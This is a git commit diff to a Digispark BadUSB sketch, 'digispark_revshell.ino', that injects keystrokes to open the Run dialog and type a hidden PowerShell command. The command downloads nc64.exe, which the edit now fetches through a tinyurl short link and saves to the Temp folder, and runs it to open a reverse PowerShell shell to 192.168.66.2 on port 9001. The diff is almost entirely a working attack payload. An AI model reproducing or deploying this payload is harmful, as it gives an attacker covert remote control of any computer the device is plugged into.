3600a84505d0238058a40e10f0a4c3ef843aa674
Sicki <hulluhalonen10@gmail.com>
2023-11-03 16:37:46 +0200

    Edit digispark_revshell.ino

--- digispark/digispark_revshell/digispark_revshell.ino
+++ digispark/digispark_revshell/digispark_revshell.ino
@@ -8,7 +8,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
 	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
 	DigiKeyboard.delay(500);
-  DigiKeyboardFi.print("powershell -w hidden -c \"Invoke-WebRequest -OutFile $env:UserProfile/nc64.exe -Uri http://192.168.66.2/nc64.exe ; Start-Process \"$env:UserProfile/nc64.exe\" -ArgumentList \'192.168.66.2\', \'9001\', \'-e\', \'powershell\' -NoNewWindow\"");
+  DigiKeyboardFi.print("powershell -w hidden -c \"Invoke-WebRequest -OutFile $env:Temp/nc64.exe -Uri https://tinyurl.com/3dkmj364 ; Start-Process \"$env:Temp/nc64.exe\" -ArgumentList \'192.168.66.2\', \'9001\', \'-e\', \'powershell\' -NoNewWindow\"");
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   exit(0);
